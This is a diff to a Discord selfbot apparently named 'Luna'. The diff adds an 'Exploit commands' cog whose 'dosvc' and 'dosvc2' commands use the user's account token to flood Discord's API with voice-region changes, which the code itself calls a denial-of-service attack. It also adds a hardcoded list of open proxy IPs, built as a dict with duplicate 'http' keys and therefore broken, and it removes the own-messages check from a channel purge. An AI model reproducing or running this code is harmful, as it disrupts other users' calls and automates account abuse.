@@ -1,5 +1,6 @@
 # -*- coding: utf-8 -*-
 
+from ast import alias
 import os
 import re
 import sys
@@ -70,6 +71,59 @@ phishing_list = [
 	"discordgifts.one",
 	"discordgifts"
 ]
+
+proxy_list = {
+    "http": "http://203.150.128.208:8080",
+    "http": "http://182.111.172.108:32997",
+    "http": "http://106.55.31.128:9999",
+    "http": "http://47.92.234.75:80",
+    "http": "http://103.245.108.186:8000",
+    "http": "http://201.28.120.142:3128",
+    "http": "http://47.243.200.250:59394",
+    "http": "http://203.189.89.158:8080",
+    "http": "http://50.206.25.109:80",
+    "http": "http://43.129.174.230:9999",
+    "http": "http://193.19.97.152:8080",
+    "http": "http://193.164.131.202:7890",
+    "http": "http://88.198.24.108:8080",
+    "http": "http://59.66.142.35:7890",
+    "http": "http://47.243.196.231:59394",
+    "http": "http://178.73.192.3:8888",
+    "http": "http://49.233.173.151:9080",
+    "http": "http://20.194.181.91:80",
+    "http": "http://103.99.8.106:83",
+    "http": "http://212.112.127.20:8080",
+    "http": "http://47.56.120.158:80",
+    "http": "http://213.163.2.206:3128",
+    "http": "http://51.79.144.52:8000",
+    "http": "http://203.189.231.154:8080",
+    "http": "http://212.95.75.12:80",
+    "http": "http://85.26.146.169:80",
+    "http": "http://51.159.5.133:3128",
+    "http": "http://200.114.97.4:999",
+    "http": "http://47.52.134.184:8118",
+    "http": "http://107.151.182.247:80",
+    "http": "http://50.206.25.104:80",
+    "http": "http://51.81.155.78:3128",
+    "http": "http://218.86.87.171:31661",
+    "http": "http://221.131.158.246:8888",
+    "http": "http://94.130.151.31:80",
+    "http": "http://58.20.234.243:9091",
+    "http": "http://212.92.204.54:8080",
+    "http": "http://50.206.25.106:80",
+    "http": "http://50.233.42.98:51696",
+    "http": "http://159.192.226.46:8080",
+    "http": "http://213.182.139.164:8080",
+    "http": "http://50.206.25.110:80",
+    "http": "http://159.65.132.219:1234",
+    "http": "http://51.222.124.242:3128",
+    "http": "http://58.187.46.247:4204",
+    "http": "http://221.125.138.189:80",
+    "http": "http://51.222.124.243:3128",
+    "http": "http://164.163.12.50:8080",
+    "http": "http://171.67.43.170:8080",
+    "http": "http://58.115.241.109:80"
+}
 
 # ///////////////////////////////////////////////////////////////
 # Luna Protections
@@ -4322,7 +4376,12 @@ class HelpCog(commands.Cog, name="Help commands"):
 			spamtext = ""
 			for command in commands:
 				spamtext+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"
-			await message_builder(luna, title="Abusive commands", description=f"{theme.description()}```\nSpam\n\n{spamtext}\n``````\nGuild\n\n{guildtext}\n``````\nMass\n\n{masstext}\n``````\nAll\n\n{alltext}\n``````\nGeneral\n\n{helptext}\n```")
+			cog = self.bot.get_cog('Exploit commands')
+			commands = cog.get_commands()
+			exploittext = ""
+			for command in commands:
+				exploittext+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"
+			await message_builder(luna, title="Abusive commands", description=f"{theme.description()}```\nExploits\n\n{exploittext}\n``````\nSpam\n\n{spamtext}\n``````\nGuild\n\n{guildtext}\n``````\nMass\n\n{masstext}\n``````\nAll\n\n{alltext}\n``````\nGeneral\n\n{helptext}\n```")
 		else:
 			await error_builder(luna, description="```\nRiskmode is disabled```")
 
@@ -4481,16 +4540,13 @@ class HelpCog(commands.Cog, name="Help commands"):
 		startup_status = files.json("Luna/config.json", "startup_status", documents=True)
 		title = theme.title()
 		footer = theme.footer()
-		hexcolor = theme.hex_color()
 		author = theme.author()
 		selfbotdetection = files.json("Luna/snipers/selfbot.json", "sniper", documents=True)
 		pings = files.json("Luna/notifications/console.json", "pings", documents=True)
-		if title == "":
+		if title == "": 
 			title = "None"
 		if footer == "":
 			footer = "None"
-		if hexcolor == "":
-			hexcolor = "None"
 		if author == "":
 			author = "None"
 		cog = self.bot.get_cog('Settings commands')
@@ -4498,7 +4554,7 @@ class HelpCog(commands.Cog, name="Help commands"):
 		helptext = ""
 		for command in commands:
 			helptext+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"
-		await message_builder(luna, title="Settings", description=f"{theme.description()}```\nYour current settings\n\nError logging     » {errorlog}\nAuto delete timer » {deletetimer}\nStartup status    » {startup_status}\nTheme             » {themesvar}\nConsole Mode      » {console_mode}\nRiskmode          » {riskmode}\nDescription       » {theme_description}\nSelfbot detection » {selfbotdetection}\nMention notify    » {pings}\n``````\nYour current theme settings\n\nTheme             » {themesvar}\nFooter            » {footer}\nColor             » {hexcolor}\nAuthor            » {author}\n``````\nSettings\n\n{helptext}```")
+		await message_builder(luna, title="Settings", description=f"{theme.description()}```\nYour current settings\n\nError logging     » {errorlog}\nAuto delete timer » {deletetimer}\nStartup status    » {startup_status}\nTheme             » {themesvar}\nConsole Mode      » {console_mode}\nRiskmode          » {riskmode}\nDescription       » {theme_description}\nSelfbot detection » {selfbotdetection}\nMention notify    » {pings}\n``````\nYour current theme settings\n\nTheme             » {themesvar}\nFooter            » {footer}\nAuthor            » {author}\n``````\nSettings\n\n{helptext}```")
 
 	@commands.command(name = "sharing",
 					usage="",
@@ -8462,7 +8518,7 @@ class UtilsCog(commands.Cog, name="Util commands"):
 				embed.set_image(url=theme.large_image_url())
 				await send(luna, embed)
 			else:
-				await luna.channel.purge(limit=amount, before=luna.message, check=is_me)
+				await luna.channel.purge(limit=amount, before=luna.message)
 		except:
 			try:
 				await asyncio.sleep(1)
@@ -9226,6 +9282,46 @@ class GuildCog(commands.Cog, name="Guild commands"):
 				await error_builder(luna, description=e)
 
 bot.add_cog(GuildCog(bot))
+class ExploitCog(commands.Cog, name="Exploit commands"):
+	def __init__(self, bot:commands.bot):
+		self.bot = bot
+
+	@commands.command(name = "dosvc",
+					usage="<channel_id> [amount]",
+					alias=["dosvc1"],
+					description = "VC Denial of Service")
+	async def dosvc(self, luna, channel:discord.VoiceChannel, amount:int=10):
+		await luna.message.delete()
+		await message_builder(luna, title="VC Denial of Service", description=f"```\nSending Attack...```", delete_after=3)
+
+		region = ['europe', 'hongkong', 'india', 'russia', 'brazil', 'japan', 'singapore', 'southafrica', 'sydney', 'us-central', 'us-east', 'us-west', 'us-south']
+
+		for x in range(amount):
+			headers = {"Authorization": user_token,"Content-Type": "application/json",
+				"Accept": "*/*",
+				"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"}
+
+			requests.patch(url=f"https://discord.com/api/v9/channels/{str(channel.id)}/call", headers=headers, json={'region':random.choice(region)})
+			await asyncio.sleep(0.5)
+
+		await message_builder(luna, title="VC Denial of Service", description=f"```\nSent Attack```", delete_after=3)
+
+	@commands.command(name = "dosvc2",
+					usage="[amount]",
+					description = "VC Denial of Service")
+	async def dosvc2(self, luna, amount:int=10):
+		await luna.message.delete()
+		await message_builder(luna, title="VC Denial of Service", description=f"```\nSending Attack...```", delete_after=3)
+
+		region = ['europe', 'hongkong', 'india', 'russia', 'brazil', 'japan', 'singapore', 'southafrica', 'sydney', 'us-central', 'us-east', 'us-west', 'us-south']
+
+		for x in range(amount):
+			requests.patch(f'https://discord.com/api/v9/guilds/{str(luna.guild.id)}', headers={'Authorization': user_token}, json={'region': random.choice(region)})
+			await asyncio.sleep(0.5)
+
+		await message_builder(luna, title="VC Denial of Service", description=f"```\nSent Attack```", delete_after=3)
+
+bot.add_cog(ExploitCog(bot))
 class AbuseCog(commands.Cog, name="Abusive commands"):
 	def __init__(self, bot:commands.bot):
 		self.bot = bot
@@ -10406,7 +10502,6 @@ class SettingsCog(commands.Cog, name="Settings commands"):
 			themevar = (themevar[:-5])
 		if themevar == "default":
 			theme_description = descriptionvar_request
-			hexcolor = hexcolorvar_request
 			if not theme_description == "true":
 				theme_description = "off"
 			else:
@@ -10414,7 +10509,6 @@ class SettingsCog(commands.Cog, name="Settings commands"):
 		else:
 			theme_json = files.json("Luna/config.json", "theme", documents=True)
 			theme_description = files.json(f"Luna/themes/{theme_json}", "description", documents=True)
-			hexcolor = files.json(f"Luna/themes/{theme_json}", "hex_color", documents=True)
 			if theme_description == None:
 				theme_description = True
 			if not theme_description:
@@ -10426,8 +10520,6 @@ class SettingsCog(commands.Cog, name="Settings commands"):
 			title = "None"
 		if footer == "":
 			footer = "None"
-		if hexcolor == "":
-			hexcolor = "None"
 		if author == "":
 			author = "None"
 
@@ -10448,7 +10540,7 @@ class SettingsCog(commands.Cog, name="Settings commands"):
 		helptext3 = ""
 		for command in commands:
 			helptext3+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"
-		await message_builder(luna, title="Customization", description=f"{theme.description()}```\nYour current theme settings\n\nTheme             » {themevar}\nFooter            » {footer}\nColor             » {hexcolor}\nAuthor            » {author}\nDescription       » {theme_description}\n``````\nSelfbot theme settings\n\n{helptext1}\n``````\nWebhook theme settings\n\n{helptext2}\n``````\nToast theme settings\n\n{helptext3}\n``````\nNote\n\nIf you want to remove a customization,\nYou can use \"None\" to remove it.\n\nIf you want to set up a random color each time\nyou run a command, you can use \"random\" as hex color.\n\nIf you want to set up your avatar as image\nUse \"avatar\" as value.```")
+		await message_builder(luna, title="Customization", description=f"{theme.description()}```\nYour current theme settings\n\nTheme             » {themevar}\nFooter            » {footer}\nAuthor            » {author}\nDescription       » {theme_description}\n``````\nSelfbot theme settings\n\n{helptext1}\n``````\nWebhook theme settings\n\n{helptext2}\n``````\nToast theme settings\n\n{helptext3}\n``````\nNote\n\nIf you want to remove a customization,\nYou can use \"None\" to remove it.\n\nIf you want to set up a random color each time\nyou run a command, you can use \"random\" as hex color.\n\nIf you want to set up your avatar as image\nUse \"avatar\" as value.```")
 
 	# @commands.command(name = "embedmode",
 	# 				usage="",
@@ -11189,24 +11281,6 @@ class CustomizeCog(commands.Cog, name="Customization commands"):
 				config.large_image_url(f"{newimageurl}")
 			prints.message(f"Changed image url to » {color.purple(f'{newimageurl}')}")
 			await message_builder(luna, description=f"```\nChanged image url to » {newimageurl}```")
-
-	@commands.command(name = "chexcolor",
-					usage="<#hex>",
-					description = "Theme hexadecimal color")
-	async def chexcolor(self, luna, newhexcolor:str):
-		await luna.message.delete()
-		if files.json("Luna/config.json", "theme", documents=True) == "default":
-			await error_builder(luna, f"```\nYou can't change the color if you're using the default theme\n``````\nPlease change the theme first with {get_prefix()}theme\n\n({get_prefix()}themes to show all available themes)```")
-		else:
-			if len(newhexcolor) < 6:
-				await error_builder(luna, description=f"```\nNot a valid HEX color code```")
-				return
-			prints.message(f"Changed hexcolor to » {color.purple(f'{newhexcolor}')}")
-			if newhexcolor == "None":
-				config.hex_color("")
-			else:
-				config.hex_color(f"{newhexcolor}")
-			await message_builder(luna, description=f"```\nChanged hexcolor to » {newhexcolor}```")
 
 	@commands.command(name = "cauthor",
 					usage="<text>",
